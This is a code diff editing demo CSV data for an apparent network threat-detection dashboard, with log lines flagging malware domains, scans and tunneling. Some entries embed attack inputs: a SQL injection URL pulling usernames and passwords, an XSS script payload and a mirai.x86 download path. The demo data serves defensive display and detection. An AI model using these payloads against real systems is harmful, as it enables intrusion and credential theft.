     '"2024-01-11 08:11:49.306893" r2d2 2.200.110.233 49279 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
@@ -907,7 +907,7 @@ function getDemoCSV() {
     '"2024-01-11 08:20:45.560886" r2d2 2.200.110.232 54039 2.200.107.168 53 UDP DNS (tremblingkeyboardassistant).com "long domain (suspicious)" (heuristic)\n' +
     '"2024-01-11 08:20:56.578571" r2d2 2.200.104.184 62904 205.251.193.194 53 UDP DNS ofhappinyer.com "pushbug (malicious)" (static)\n' +
     '"2024-01-11 08:21:58.370909" r2d2 2.200.108.103 60619 8.8.4.4 53 UDP DNS disorderstatus.ru "andromeda (malware)" (static)\n' +
-    '"2024-01-11 08:23:48.089370" r2d2 2.200.104.32 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
+    '"2024-01-11 08:23:48.089370" r2d2 10.128.8.51 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
     '"2024-01-11 08:24:05.197601" r2d2 2.200.104.184 62594 205.251.192.236 53 UDP DNS juronu.com "pua (suspicious)" (static)\n' +
     '"2024-01-11 08:24:42.840080" r2d2 2.200.110.232 49383 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 08:24:49.742072" r2d2 2.200.104.184 64101 212.18.249.42 53 UDP DNS (go.cp4srvng).xyz "domain (suspicious)" (static)\n' +
@@ -947,7 +947,7 @@ function getDemoCSV() {
     '"2024-01-11 08:36:44.048432" r2d2 10.124.72.52 1259 8.8.4.4 53 UDP DNS hzmksreiuojy.com "andromeda (malware)" (static)\n' +
     '"2024-01-11 08:37:07.472131" r2d2 2.200.110.232 64519 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 08:37:14.366731" r2d2 10.18.20.51 52749 10.1.20.238 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
-    '"2024-01-11 08:38:49.769973" r2d2 2001:db8:2::17 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 08:38:49.769973" r2d2 2001:db8:2::17 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 08:39:15.212072" r2d2 2.200.105.226 58815 208.67.222.123 53 UDP DNS (vast.yomeno).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 08:39:15.212072" "dmz probe" 2.200.105.226 58815 208.67.222.123 53 UDP DNS (vast.yomeno).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 08:39:15.212359" r2d2 2.200.105.226 58815 208.67.222.123 53 UDP DNS (vast.yomeno).xyz "domain (suspicious)" (static)\n' +
@@ -961,8 +961,8 @@ function getDemoCSV() {
     '"2024-01-11 08:39:57.252520" r2d2 2.200.108.59 21090 198.54.117.197 443 TCP IP 198.54.117.197 "parking site (suspicious)" (static)\n' +
     '"2024-01-11 08:40:01.271009" r2d2 2.200.108.59 42099 198.54.117.197 443 TCP IP 198.54.117.197 "parking site (suspicious)" (static)\n' +
     '"2024-01-11 08:40:23.238141" r2d2 2.200.104.184 65365 173.245.58.51 53 UDP DNS geolocation-db.com "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 08:41:08.238156" r2d2 2001:db8:2::17 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
-    '"2024-01-11 08:41:23.800639" r2d2 2001:db8:2::17 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 08:41:08.238156" r2d2 2001:db8:2::17 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
+    '"2024-01-11 08:41:23.800639" r2d2 2001:db8:2::17 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 08:41:44.478911" r2d2 178.17.174.14 55256 2.200.109.24 80 TCP UA "MyIE (Mozilla/5.0 \\(Windows NT 6.1; WOW64\\) AppleWebKit/537.36 \\(KHTML, like Gecko\\) Chrome/33.0.1750.117 Safari/537.36 MyIE;)" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 08:41:52.700782" r2d2 2.200.110.232 63897 2.200.107.169 53 UDP DNS 7tno4hib47vlep5o.42kdb12.net "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 08:41:57.661337" r2d2 2.200.110.233 63552 2.200.107.168 53 UDP DNS supervision.sactown.us "ek nuclear (malicious)" (static)\n' +
@@ -1001,7 +1001,7 @@ function getDemoCSV() {
     '"2024-01-11 08:53:59.608495" r2d2 2.200.110.232 65133 2.200.107.168 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 08:55:21.075195" r2d2 2.200.105.226 59672 208.67.222.123 53 UDP DNS ofhappinyer.com "pushbug (malicious)" (static)\n' +
     '"2024-01-11 08:55:23.169769" r2d2 2.200.110.233 65299 2.200.107.169 53 UDP DNS ofhappinyer.com "pushbug (malicious)" (static)\n' +
-    '"2024-01-11 08:55:53.559097" r2d2 10.2.120.16 50008 203.0.113.14 80 TCP URL xss.example(/search?q=<script>alert%281%29</script>) "potential xss injection (suspicious)" (heuristic)\n' +
+    '"2024-01-11 08:55:53.559097" r2d2 10.43.192.103 50008 203.0.113.14 80 TCP URL xss.example(/search?q=<script>alert%281%29</script>) "potential xss injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 08:57:17.722508" r2d2 2.200.110.232 49455 2.200.107.168 53 UDP DNS (cdn).special-offers.online "pushbug (malicious)" (static)\n' +
     '"2024-01-11 08:57:23.347177" r2d2 2.200.108.59 17714 8.8.8.8 53 UDP DNS srv5010.net "phorpiex (malware)" (static)\n' +
     '"2024-01-11 08:57:41.846970" r2d2 2.200.107.168 53 2.200.110.233 55874 UDP DNS (kondilomi).info "parked site (suspicious)" (heuristic)\n' +
@@ -1038,7 +1038,7 @@ function getDemoCSV() {
     '"2024-01-11 09:09:43.392551" r2d2 178.17.174.14 43680 2.200.109.24 80 TCP UA "FunWebProducts (Mozilla/4.0 \\(compatible; MSIE 8.0; Windows NT 6.0; WOW64; Trident/4.0; FunWebProducts; BTRS105073; MSN 9.0;MSN 9.1;MSN 9.6;MSN 10.0;MSN 10.2;MSN 10.5; MSNbMSNI; MSNmen-us; MSNcOTH\\))" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 09:09:43.402432" r2d2 2.200.110.232 64902 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 09:09:43.404287" r2d2 2.200.107.146 5868 45.54.64.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 09:10:05.519865" r2d2 2.200.110.232 50010 198.51.100.99 80 TCP HTTP (198.51.100.99)/mirai.x86 "potential iot-malware download (suspicious)" (heuristic)\n' +
+    '"2024-01-11 09:10:05.519865" r2d2 10.128.3.51 50010 198.51.100.99 80 TCP HTTP (198.51.100.99)/mirai.x86 "potential iot-malware download (suspicious)" (heuristic)\n' +
     '"2024-01-11 09:11:17.370882" r2d2 2.200.107.146 56959 172.64.33.153 53 UDP DNS (boxformula).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 09:11:38.932555" r2d2 10.3.160.42 19852 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 09:11:41.035775" r2d2 10.3.160.42 19852 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
@@ -1082,20 +1082,20 @@ function getDemoCSV() {
     '"2024-01-11 09:22:16.101225" r2d2 192.168.137.16 64036 192.168.239.11 53 UDP DNS epicunitscan.info "patchbrowse (malware)" (static)\n' +
     '"2024-01-11 09:22:37.389951" r2d2 192.168.137.140 63407 192.168.239.10 53 UDP DNS (trk).ipaddress.com "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 09:22:38.994010" r2d2 2.200.110.233 49337 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 09:22:58.469779" r2d2 10.2.120.16 31000 9.9.9.9 53 UDP DNS (h01000).lookup.aeqx-cdn.net "potential dns exhaustion (suspicious)" (heuristic)\n' +
+    '"2024-01-11 09:22:58.469779" r2d2 10.43.192.103 31000 9.9.9.9 53 UDP DNS (h01000).lookup.aeqx-cdn.net "potential dns exhaustion (suspicious)" (heuristic)\n' +
     '"2024-01-11 09:23:00.284084" r2d2 2.200.97.1 52609 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 09:23:04.439273" r2d2 10.2.65.203 53170 10.1.108.50 53 UDP DNS cdnrep.reimage.com "pua (suspicious)" (static)\n' +
     '"2024-01-11 09:23:43.397784" r2d2 2.200.110.232 63871 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 09:23:43.397784" "dmz probe" 2.200.110.232 63871 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 09:24:19.664308" r2d2 2.200.110.233 64821 2.200.107.168 53 UDP DNS (en).softonic.com "pua (suspicious)" (static)\n' +
-    '"2024-01-11 09:24:36.810048" r2d2 2.200.110.232 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
+    '"2024-01-11 09:24:36.810048" r2d2 10.128.3.51 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 09:24:58.081574" r2d2 2.200.107.146 43583 52.58.214.33 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 09:26:20.938315" r2d2 10.124.72.52 2121 8.8.4.4 53 UDP DNS hzmksreiuojy.com "andromeda (malware)" (static)\n' +
     '"2024-01-11 09:26:46.404412" r2d2 2.200.104.184 62962 13.248.132.88 53 UDP DNS extreme-ip-lookup.com "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 09:27:28.659542" r2d2 10.2.120.16 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
+    '"2024-01-11 09:27:28.659542" r2d2 10.43.192.103 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
     '"2024-01-11 09:27:40.350861" r2d2 10.3.160.42 19860 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 09:27:59.971406" r2d2 2.200.107.146 64576 192.43.172.30 53 UDP DNS monerohash.com "crypto mining (suspicious)" "(static) (+github.com/Hestat)"\n' +
-    '"2024-01-11 09:28:45.057308" r2d2 2.200.110.232 50010 198.51.100.99 80 TCP HTTP (198.51.100.99)/mirai.x86 "potential iot-malware download (suspicious)" (heuristic)\n' +
+    '"2024-01-11 09:28:45.057308" r2d2 10.128.3.51 50010 198.51.100.99 80 TCP HTTP (198.51.100.99)/mirai.x86 "potential iot-malware download (suspicious)" (heuristic)\n' +
     '"2024-01-11 09:29:15.966330" r2d2 2.200.107.146 26184 194.169.218.12 53 UDP DNS (server.4online).pw "domain (suspicious)" (static)\n' +
     '"2024-01-11 09:29:38.556566" r2d2 2.200.110.232 63546 2.200.107.168 53 UDP DNS tredokilo745241.ru "zeus (malware)" (static)\n' +
     '"2024-01-11 09:30:43.403712" r2d2 2.200.110.232 49342 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
@@ -1127,9 +1127,9 @@ function getDemoCSV() {
     '"2024-01-11 09:39:45.032975" r2d2 10.3.160.42 29097 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 09:39:48.051054" r2d2 192.168.137.16 65260 192.168.239.10 53 UDP DNS epicunitscan.info "patchbrowse (malware)" (static)\n' +
     '"2024-01-11 09:40:09.466994" r2d2 2.200.110.232 64000 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 09:41:04.869085" r2d2 2.200.104.32 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
+    '"2024-01-11 09:41:04.869085" r2d2 10.124.72.52 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
     '"2024-01-11 09:41:05.639462" r2d2 10.36.192.149 53907 10.1.194.234 53 UDP DNS epicunitscan.info "patchbrowse (malware)" (static)\n' +
-    '"2024-01-11 09:41:18.343132" r2d2 10.3.160.42 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
+    '"2024-01-11 09:41:18.343132" r2d2 10.2.120.16 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
     '"2024-01-11 09:41:18.630736" r2d2 2.200.110.233 63414 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 09:41:55.464925" r2d2 2.200.107.168 53 2.200.106.65 54267 UDP DNS (forensicanthropology).eu-content "entropy threshold no such domain (suspicious)" (heuristic)\n' +
     '"2024-01-11 09:42:11.062713" r2d2 2.200.104.184 50589 69.94.69.211 80 TCP UA undefined "user agent (suspicious)" (heuristic)\n' +
@@ -1156,7 +1156,7 @@ function getDemoCSV() {
     '"2024-01-11 09:52:46.700088" r2d2 2.200.107.146 62986 192.52.178.30 53 UDP DNS (turquoise210broderiemachine).over-blog.com "long domain (suspicious)" (heuristic)\n' +
     '"2024-01-11 09:52:54.100953" r2d2 10.124.72.52 2464 8.8.4.4 53 UDP DNS hzmksreiuojy.com "andromeda (malware)" (static)\n' +
     '"2024-01-11 09:53:31.000007" r2d2 2.200.108.59 17571,17572,17573,17575,17589,17591,17593,17594,17602,17603,17604,17607,17608,17609,17610,17611,17614,33110,33874,33938,33988,36404,36816,37388,37389,37391,39018,40074,40586,43230,43436,44666,45204,46092,46214,46624,49456,50938,50939,51134,53706,56208,56326,56682,56698,56720,56728,58662,59412,60484 77.53.81.105 21,12582,12950,14596,16312,16604,19313,20198,22235,23657,24236,26825,29492,31351,33551,34039,34261,37402,38286,41302,42488,45869,50420,56319,56504,59052,61497,63579,64451 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
-    '"2024-01-11 09:53:32.893145" r2d2 2.200.110.232 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
+    '"2024-01-11 09:53:32.893145" r2d2 10.128.3.52 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
     '"2024-01-11 09:54:09.122840" r2d2 2.200.104.184 62561 192.55.83.30 53 UDP DNS (ssl).geoplugin.net "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 09:54:16.882037" r2d2 2.200.104.184 59914 8.8.4.4 53 UDP DNS disorderstatus.ru "andromeda (malware)" (static)\n' +
     '"2024-01-11 09:54:17.148615" r2d2 2.200.104.184 61343 8.8.4.4 53 UDP DNS disorderstatus.ru "andromeda (malware)" (static)\n' +
@@ -1229,13 +1229,13 @@ function getDemoCSV() {
     '"2024-01-11 10:15:16.116498" r2d2 2.200.110.233 65110 2.200.107.168 53 UDP DNS (ipv4bot).whatismyipaddress.com "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 10:15:59.705628" r2d2 2.200.107.146 1243 52.57.28.60 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 10:16:03.585947" r2d2 10.3.160.42 50011 203.0.113.16 80 TCP HTTP http://proxycheck.example/ "potential proxy probe (suspicious)" (heuristic)\n' +
-    '"2024-01-11 10:16:17.511516" r2d2 2001:db8:2::17 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 10:16:17.511516" r2d2 2001:db8:2::17 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 10:17:30.514795" r2d2 2.200.110.233 63707 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 10:17:59.291392" r2d2 2.200.110.232 65516 2.200.107.169 53 UDP DNS (cdn).special-offers.online "pushbug (malicious)" (static)\n' +
     '"2024-01-11 10:17:59.317705" r2d2 2.200.110.233 64979 2.200.107.168 53 UDP DNS (cdn).special-offers.online "pushbug (malicious)" (static)\n' +
     '"2024-01-11 10:19:41.753030" r2d2 2.200.109.177 17142 8.8.8.8 53 UDP DNS geoip-db.com "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 10:19:49.380726" r2d2 10.3.160.42 7780 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 10:19:50.883929" r2d2 2001:db8:2::11 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 10:19:50.883929" r2d2 2001:db8:2::11 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 10:20:13.401636" r2d2 10.1.80.51 60043 10.1.20.238 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 10:21:00.573010" r2d2 2.200.110.233 49154 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 10:21:01.222739" r2d2 10.124.72.51 3265 8.8.4.4 53 UDP DNS hzmksreiuojy.com "andromeda (malware)" (static)\n' +
@@ -1249,7 +1249,7 @@ function getDemoCSV() {
     '"2024-01-11 10:23:32.000016" r2d2 2.200.108.59 16099,16104,16107,16110,16113,16116,16122,16127,16131,33366,34670,36492,37198,38650,38868,40026,41730,42226,43080,44764,47332,48872,49550,49756,49850,49938,49942,50656,51814,51862,52634,53772,54220,54920,55440,56078,56514,59312,59514 77.53.81.105 21,5371,5738,7138,10261,10600,11059,14607,15680,16183,17950,18934,21126,21294,21440,24324,24469,25776,27319,35335,37770,42761,43905,44408,48473,49110,49370,53408,54600,61247,64990 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 10:24:28.816999" r2d2 10.1.12.220 56129 10.1.192.236 53 UDP DNS geolocation-db.com "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 10:24:28.819416" r2d2 2.200.107.146 45118 192.41.162.30 53 UDP DNS geolocation-db.com "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 10:24:31.312907" r2d2 2.200.104.32 50012 203.0.113.17 80 TCP URL dl.example(/setup.exe) "direct .exe download (suspicious)" (heuristic)\n' +
+    '"2024-01-11 10:24:31.312907" r2d2 10.124.72.52 50012 203.0.113.17 80 TCP URL dl.example(/setup.exe) "direct .exe download (suspicious)" (heuristic)\n' +
     '"2024-01-11 10:25:09.883035" r2d2 2.200.109.50 61705 8.8.8.8 53 UDP DNS id.remoteutilities.com "rmsrat (malware)" (static)\n' +
     '"2024-01-11 10:25:31.133391" r2d2 10.124.72.52 2852 8.8.4.4 53 UDP DNS hzmksreiuojy.com "andromeda (malware)" (static)\n' +
     '"2024-01-11 10:26:02.497425" r2d2 2.200.107.146 23056 173.201.70.3 53 UDP DNS (www.raymond).cc "domain (suspicious)" (static)\n' +
@@ -1260,17 +1260,17 @@ function getDemoCSV() {
     '"2024-01-11 10:27:59.626673" r2d2 2.200.110.232 65386 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 10:28:19.012304" r2d2 10.6.0.51 64086 10.1.20.50 53 UDP DNS tbapi.search.ask.com "pua (suspicious)" (static)\n' +
     '"2024-01-11 10:29:10.835375" r2d2 2.200.110.233 65263 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 10:29:20.374938" r2d2 2.200.104.32 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
+    '"2024-01-11 10:29:20.374938" r2d2 10.124.72.52 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
     '"2024-01-11 10:30:18.543533" r2d2 2.200.110.233 63419 2.200.107.168 53 UDP DNS soaring.betsystemreviews.com "ek nuclear (malicious)" (static)\n' +
     '"2024-01-11 10:30:18.969588" r2d2 2.200.107.146 43785 193.232.128.6 53 UDP DNS recenthosts.ru "generic (malware)" (static)\n' +
-    '"2024-01-11 10:30:53.909628" r2d2 10.2.120.16 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
+    '"2024-01-11 10:30:53.909628" r2d2 10.124.72.51 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 10:31:34.124979" r2d2 2.200.110.232 51782 2.200.107.168 53 UDP DNS (go.cp4srvng).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 10:31:48.091914" r2d2 2.200.110.233 49153 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 10:31:51.416289" r2d2 10.3.160.42 7786 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 10:31:52.516697" r2d2 10.3.160.42 7786 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 10:32:11.975967" r2d2 10.8.221.50 53061 10.1.20.50 53 UDP DNS tbapi.search.ask.com "pua (suspicious)" (static)\n' +
     '"2024-01-11 10:32:38.553417" r2d2 2.200.107.146 14183 192.36.148.17 53 UDP DNS content-delivery.in "afrodita (malware)" (static)\n' +
-    '"2024-01-11 10:32:47.052087" r2d2 2.200.110.232 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
+    '"2024-01-11 10:32:47.052087" r2d2 10.128.3.51 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
     '"2024-01-11 10:32:52.106400" r2d2 2.200.104.32 63729 173.245.59.41 53 UDP DNS (cdn).special-offers.online "pushbug (malicious)" (static)\n' +
     '"2024-01-11 10:32:52.157739" r2d2 2.200.107.248 23573 8.8.8.8 53 UDP DNS (pro).ip-api.com "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 10:32:59.611786" r2d2 2.200.110.232 64822 2.200.107.169 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
@@ -1292,7 +1292,7 @@ function getDemoCSV() {
     '"2024-01-11 10:39:04.675661" r2d2 2.200.104.32 54814 199.254.50.1 53 UDP DNS epicunitscan.info "patchbrowse (malware)" (static)\n' +
     '"2024-01-11 10:39:08.282517" r2d2 2.200.107.146 61473 163.114.217.17 53 UDP DNS monerohash.com "crypto mining (suspicious)" "(static) (+github.com/Hestat)"\n' +
     '"2024-01-11 10:39:09.906912" r2d2 2.200.104.184 61963 194.169.218.42 53 UDP DNS (indianpornsex).xyz "domain (suspicious)" (static)\n' +
-    '"2024-01-11 10:39:12.812535" r2d2 2.200.110.232 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
+    '"2024-01-11 10:39:12.812535" r2d2 10.128.3.52 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
     '"2024-01-11 10:40:00.741546" r2d2 2.200.110.232 54029 2.200.107.168 53 UDP DNS jafuq.com "pua (suspicious)" (static)\n' +
     '"2024-01-11 10:40:00.743328" r2d2 2.200.107.146 12349 205.251.197.29 53 UDP DNS jafuq.com "pua (suspicious)" (static)\n' +
     '"2024-01-11 10:40:43.390315" r2d2 2.200.107.146 57696 194.62.183.53 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
@@ -1317,7 +1317,7 @@ function getDemoCSV() {
     '"2024-01-11 10:45:26.534215" r2d2 2.200.104.184 64076 172.64.34.252 53 UDP DNS (indianpornsex).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 10:45:47.230781" r2d2 2.200.107.248 20965 199.59.242.155 80 TCP IP 199.59.242.155 "parking site (suspicious)" (static)\n' +
     '"2024-01-11 10:46:13.450977" r2d2 2.200.108.98 55415 2.200.107.169 53 UDP DNS (go.cp4srvng).xyz "domain (suspicious)" (static)\n' +
-    '"2024-01-11 10:46:37.113752" r2d2 10.3.160.42 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
+    '"2024-01-11 10:46:37.113752" r2d2 10.2.120.16 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
     '"2024-01-11 10:47:24.000029" r2d2 2.200.215.186 53284 2.200.108.140 445 TCP PORT 445 "potential infection" (heuristic)\n' +
     '"2024-01-11 10:47:53.785194" r2d2 10.3.160.42 22246 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 10:48:08.519684" r2d2 2.200.107.146 25366 156.154.125.65 53 UDP DNS xlppvior.biz "conficker dga (malware)" 360.com\n' +
@@ -1334,7 +1334,7 @@ function getDemoCSV() {
     '"2024-01-11 10:49:11.423504" r2d2 2.200.108.98 57354 2.200.107.169 53 UDP DNS uqwnjwo.org "conficker dga (malware)" 360.com\n' +
     '"2024-01-11 10:49:19.954233" r2d2 10.124.162.65 1175 172.16.70.102 53 UDP DNS rdcxxt.biz "conficker dga (malware)" 360.com\n' +
     '"2024-01-11 10:49:20.518332" r2d2 2.200.107.146 49309 199.249.120.1 53 UDP DNS hxtrweatse.org "conficker dga (malware)" 360.com\n' +
-    '"2024-01-11 10:49:34.853778" r2d2 10.3.160.42 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
+    '"2024-01-11 10:49:34.853778" r2d2 10.2.120.16 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 10:49:37.955625" r2d2 2.200.107.146 61448 199.249.113.1 53 UDP DNS mutsz.info "conficker dga (malware)" 360.com\n' +
     '"2024-01-11 10:49:55.906480" r2d2 2.200.108.98 55907 2.200.107.169 53 UDP DNS cdoktffgmrj.net "conficker dga (malware)" 360.com\n' +
     '"2024-01-11 10:49:56.048137" r2d2 2.200.108.98 57473 2.200.107.169 53 UDP DNS gyisgnl.net "conficker dga (malware)" 360.com\n' +
@@ -1385,7 +1385,7 @@ function getDemoCSV() {
     '"2024-01-11 10:57:31.217093" r2d2 2.200.110.232 52435 2.200.107.168 53 UDP DNS geedoovu.net "ek router (malicious)" (static)\n' +
     '"2024-01-11 10:58:18.878052" r2d2 2.200.110.232 63891 2.200.107.169 53 UDP DNS 7tno4hib47vlep5o.42kdb12.net "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 10:59:05.445460" r2d2 10.2.64.50 49717 10.1.20.50 53 UDP DNS cdnrep.reimage.com "pua (suspicious)" (static)\n' +
-    '"2024-01-11 10:59:20.194704" r2d2 2001:db8:2::17 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 10:59:20.194704" r2d2 2001:db8:2::17 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 11:00:10.507748" r2d2 2.200.104.184 61302 173.245.58.51 53 UDP DNS (cdn).special-offers.online "pushbug (malicious)" (static)\n' +
     '"2024-01-11 11:00:38.441116" r2d2 2.200.110.232 63834 2.200.107.169 53 UDP DNS iynus.net "locky (malware)" (static)\n' +
     '"2024-01-11 11:00:38.485465" r2d2 2.200.110.233 64050 2.200.107.168 53 UDP DNS iynus.net "locky (malware)" (static)\n' +
@@ -1406,7 +1406,7 @@ function getDemoCSV() {
